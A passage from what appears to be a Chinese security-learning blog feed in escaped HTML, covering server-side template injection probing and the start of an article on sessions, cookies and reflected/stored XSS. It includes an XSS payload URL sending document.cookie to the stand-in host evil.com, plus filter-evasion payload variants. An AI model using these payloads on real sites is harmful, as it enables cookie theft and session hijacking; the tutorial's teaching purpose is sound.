&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;freemarker=Hello ${username}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello newuser 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;any=&amp;lt;b&amp;gt;Hello&amp;lt;/b&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;b&amp;gt;Hello&amp;lt;b&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;Code context 代码上下文 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们通过输入一些代码片段来观察返回的内容是否显示了我们想要得到的拼接结果： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;personal_greeting=username
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello user01
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;personal_greeting=username&amp;lt;tag&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;personal_greeting=username}}&amp;lt;tag&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hello user01 &amp;lt;tag&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;identify&#34;&gt;Identify&lt;/h3&gt;
&lt;p&gt;在成功检测到了模板引擎的存在之后，下一步就是要确定哪一种引擎被使用了，我们可以根据不同的语法来进行输入并观察返回的结果： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;James Kettle 为我们提供了这张决策树，绿色表示成功识别，红色代表失败需要进一步尝试： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;例如当我们在尝试 &lt;code&gt;{{7 * 7&#39;}}&lt;/code&gt; 时，如果返回49那么就是Twig,如果是 7777777 就是 Jinja2 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-02_11-22-28_screenshot.png&#34;
         alt=&#34;Figure 6: 模板识别&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 6: &lt;!-- raw HTML omitted --&gt;模板识别&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
&lt;p&gt;接着我们就要尝试利用这些模板引擎所存在的漏洞： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;read&#34;&gt;Read&lt;/h4&gt;
&lt;p&gt;在我们识别成功之后，下一步就是非常关键的阅读文档阶段，只有了解了模板语言之后我们才能找到利用的方法: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基础的语法 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;查看有关安全的相关章节，我们可以假设一些开发者并没有关注这些容易出现问题的点 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;内置的方法，函数，过滤器以及变量，比如查看内置的函数的源码，是否有出现危险函数的使用，从而进一步引发远程代码执行？ &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;查看插件或者扩展，特别是那些默认开启的内容 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;explore&#34;&gt;Explore&lt;/h4&gt;
&lt;p&gt;下一步就是关注模板引擎运行环境，通常这些模板引擎会提供一些全局变量或者实例对象，这些实例中往往就存在一些敏感信息或者危险的函数可以被调用： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;如果没有这样的内置对象可以为我们所用，也可以通过fuzz寻找可能的变量名，比如&lt;a class=&#34;link&#34; href=&#34;https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SecLists&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h4 id=&#34;attack&#34;&gt;Attack&lt;/h4&gt;
&lt;p&gt;在经过以上两步的信息获取之后，最后就是要用所有可以利用的资源来组合进行攻击，尝试造成一些常见的攻击，比如非法对象创建，敏感信息泄露，远程文件包含，webshell，提权等； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://en.wikipedia.org/wiki/Template_processor&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Template processor&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://gosecure.github.io/template-injection-workshop&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Template Injection in Action&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0_51945027/article/details/116491279&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;什么是模板引擎？&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/m0_61607810/article/details/121568121&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;模板引擎？看这一篇就懂了&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/wjnlv&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;一、模板引擎有什么用？&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/research/server-side-template-injection&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Server-Side Template Injection&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Client-side Attacks 针对客户端的Web攻击</title>
        <link>https://ginkgo.org.cn/posts/client_side_attacks/</link>
        <pubDate>Thu, 19 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ginkgo.org.cn/posts/client_side_attacks/</guid>
        <description>&lt;h2 id=&#34;写在前面&#34;&gt;写在前面&lt;/h2&gt;
&lt;p&gt;阅读本文，我们讲一起了解两种针对客户端的Web攻击： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XSS &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;CSRF &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接着我们会跟着Mozilla的文档一起了解什么是同源策略，最后我们会一起来总结一下针对客户端的Web攻击的防御措施： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;prerequisite-前提知识&#34;&gt;Prerequisite 前提知识&lt;/h2&gt;
&lt;h3 id=&#34;session&#34;&gt;Session&lt;/h3&gt;
&lt;p&gt;要了解针对Web客户端的攻击，我们必须要先了解 &lt;strong&gt;Session&lt;/strong&gt; 与 &lt;strong&gt;Cookie&lt;/strong&gt; 的机制； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们为什么需要Session以及Cookie？ &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;HTTP协议在最初设计的时候是一个无状态（stateless）的协议，用户在浏览网页的时候发出请求，客户端只是返回页面的内容，不会保留任何关于本次请求的信息，即对用户一无所知。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;可是随着Web应用的发展，一些服务需要 &lt;strong&gt;保存用户的状态&lt;/strong&gt;,例如网购等就需要用户进行登录后访问自己的专属内容，那么实现状态（state）保存的方式就是 &lt;code&gt;Session&lt;/code&gt; 会话：会话的双方就是服务器端以及浏览器的用户端； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;每次用户发起请求，向服务端请求关于其专属账号的内容的时候，都需要附带上自己专属的信息，来告诉服务器返回其专属信息，比如 credential个人标识符, 添加在购物车的内容。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;保存这些内容的方式有： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;保存在本地html中的隐藏内容 (过时); &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;INPUT&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;NAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;sessionid&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;VALUE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;7456&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cookie (后面展开); &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;而向服务器端传递这些信息的手法有： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;URL &lt;!-- raw HTML omitted --&gt;
&lt;a class=&#34;link&#34; href=&#34;http://www.example.com/page.php?sessionid=7456&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.example.com/page.php?sessionid=7456&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP header (e.g., cookie) &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /page.php HTTP/1.1 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: www.example.com 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Cookie: sessionid=7456 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;慢慢的, &lt;strong&gt;Cooike&lt;/strong&gt; 开始被广泛的使用，但是cookie有大小的限制（maximum size: 4096bytes）,无法存储太多的内容，那么我们为什么不在服务端来存储这些信息呢？这样也更安全，信息也可以更方便的被利用。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;那么又多了一个问题，就是服务端存储了这些内容，那么客户端告诉服务端自己需要的是哪一个session的内容呢？ &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这些就需要服务端在开启一个session（例如用户登录的时候）的时候，返回给客户端一个 &lt;code&gt;sessionId&lt;/code&gt; ; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;之后每次客户端发出HTTP请求的时候，都带上这个 &lt;code&gt;sessionId&lt;/code&gt;, 服务端就知道了是谁要访问什么信息了，然后当用户登出的时候，就自动删除session的内容节省内存（历史信息存储到数据库中）。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过以上我们可以稍微总结一下Session与Cookie的特点： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Session是存储在服务端的，由sessionId来唯一标识； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;Cookie是由服务端产生后保存在客户端的简短信息，用在HTTP请求中向服务端展示所拥有的信息（包括 &lt;strong&gt;sessionId&lt;/strong&gt; ； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cookie&#34;&gt;Cookie&lt;/h3&gt;
&lt;p&gt;接下来，我们再来展开讲讲Cookie的内容： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们再来回顾一下，Cookie与Session最大的区别就是: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cookie是由 &lt;code&gt;服务器端创造&lt;/code&gt; 的，存储在 &lt;code&gt;客户端&lt;/code&gt; 的信息； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;是服务器要求客户端浏览器保存键值对的一种技术； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;客户端有了Cookie之后，每次请求都发送给服务器，同时每个cookie的大小不能超过4KB &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果我们用BurpSuite抓取HTTP请求，我们就会发现很多请求都会带上Cookie的内容，这就是 &lt;strong&gt;客户端&lt;/strong&gt; 通过向 &lt;strong&gt;服务端&lt;/strong&gt; 展示自己所拥有的（来自服务端分配的）特定cookie，来减少认证的复杂度； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-19_10-45-46_screenshot.png&#34;
         alt=&#34;Figure 1: Server通过响应中的Set-Cookie来给客户端分配Cookie&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;Server通过响应中的Set-Cookie来给客户端分配Cookie&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;Cookie通过HTTP header向服务端进行传递，默认情况下是一对键值对，但也可以设置一些额外的信息来增加使用的灵活性； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-19_10-46-54_screenshot.png&#34;
         alt=&#34;Figure 2: Cookie以键值对的形式存储&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;Cookie以键值对的形式存储&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们可以利用浏览器来观察这些存储到浏览器本地的cookie: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-19_10-50-18_screenshot.png&#34;
         alt=&#34;Figure 3: 浏览器的Inspection功能&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;浏览器的Inspection功能&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;服务端则通过HTTP的回复来设置cookie的内容以及其他参数： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-19_10-51-35_screenshot.png&#34;
         alt=&#34;Figure 4: HTTP响应中Set-Cookie的例子&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;HTTP响应中Set-Cookie的例子&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;client-side-attacks-goals-针对客户端的攻击的目标&#34;&gt;Client-side Attacks Goals 针对客户端的攻击的目标&lt;/h2&gt;
&lt;p&gt;下面这些就是针对客户端的攻击所想要达成的目的： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;盗取Cookie; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;篡改登录表格; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;执行额外的HTTP请求; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;以及任何用HTML以及Javascript做的任何事情！ &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;xss&#34;&gt;XSS&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Cross-Site Scripting&lt;/strong&gt; 跨站脚本攻击(简写为XSS主要是为了与CSS区分开)的主要目标就是： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为了能够在目标页面上执行非法的脚本（JS）代码， &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨站&lt;/strong&gt; 二字就体现在执行了本不应该出现在这个网站上的脚本代码。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般来说，造成的原因还是缺乏对于用户输入的检查，进而导致非法的HTML/JS代码注入到页面上，被浏览器解析之后，攻击者就是可以执行任意代码； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;其具体表现往往就是通过精心设计的一个 &lt;strong&gt;URL&lt;/strong&gt;, 通过社会工程学的方法诱导用户进行点击，URL中包含了将会植入到页面当中，被浏览器所解析进而执行恶意代码。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接着我们来看一看常见的三种XSS攻击: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;reflected-xss-反射型xss&#34;&gt;Reflected XSS 反射型XSS&lt;/h3&gt;
&lt;p&gt;&amp;ldquo;反射&amp;quot;意味着： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个用户将不合法的输入（例如一段js代码）先传给服务器; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;然后服务器再将不合法的js代码（当作正常的内容）嵌入HTML后通过HTTP响应再反射给用户; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;进而浏览器解析执行这些恶意的js代码，从而造成危害； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一般来说，黑客会通过社会工程学的手段来诱导用户点击一个包含恶意代码的链接。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反射型XSS&lt;/strong&gt; 也被称为 &lt;strong&gt;非持久化XSS&lt;/strong&gt;, 因为其要求用户点击恶意链接才能执行一次； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;接下来我们来通过一个例子来说明反射型XSS是如何工作并造成损害的： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;服务器上有一个页面的叫做 &lt;code&gt;xss_test.php&lt;/code&gt;, 其中有一段代码要求用户输入用户名，输入的用户名则会返回到页面上： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Welcome&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;inject&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户被诱导点击了一条恶意修改的网页链接（添加了js代码）； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://www.example.com/xss_test.php?inject=&amp;lt;script&amp;gt;document.location=&amp;#39;http://evil.com/log.php?&amp;#39;+document.cookie&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以看到这里 &lt;code&gt;inject&lt;/code&gt; 参数被设置为了 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签所包含的代码来访问攻击者的域名并提供当前网页所拥有的cookie的值（ document.cookie）; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在用户点击之后，浏览器就会生成HTTP请求向服务器寻求资源，其中就包含了攻击者所包含的恶意代码 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /xss_test.php?inject=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fevil%2Flog.php%3F%27%2Bdocument.cookie%3C%2Fscript%3E 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: www.example.com 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;服务端的脚本通过将原本应该为用户名的内容拼接成HTML返回给用户，然后由浏览器自动解析执行，导致恶意代码被执行，用户的cookie被返回给了攻击者的网站，造成了cookie的泄露； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;开发者会利用各种办法来相办法来过滤这些恶意篡改的请求，用户也很容易发现异常的链接，但是攻击者仍然可以用模糊的手法来进行绕过，例如： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Url encoding: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://www.example.com/xss_test.php?inject=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%63%69%61%6F%27%29%3B%3C%2F%73%63%72%69%70%74%3E
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不使用 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签的形式： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://www.example.com/xss_test.php?inject=&amp;lt;img%20onerror=&amp;#34;javascript:%20alert(document.cookie);&amp;#34;%20src=asd&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;动态执行（动态的构建恶意代码的内容）： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://www.example.com/xss_test.php?inject=&amp;lt;script&amp;gt;eval(String.fromCharCode(97,108,101,114,116,40,39,99,105,97,111,39,41,59))&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们甚至可以将包含漏洞的链接通过短网址缩短或者转换为二维码来绕过检测： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;stored-xss-存储型-xss&#34;&gt;Stored XSS 存储型 XSS&lt;/h3&gt;
&lt;p&gt;存储型XSS顾名思义，恶意代码会先被攻击者上传存储在网页的服务端的数据库当中，当用户访问该网站时，存储的恶意代码会被服务端自动嵌入HTML中，然后由用户本地的浏览器解析执行，造成危害。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;这种攻击一般就发生在用户可以获取其他用户进行的输入的地方，常见的就有论坛或者留言板等内容。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;存储型XSS与反射型XSS最大的区别： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
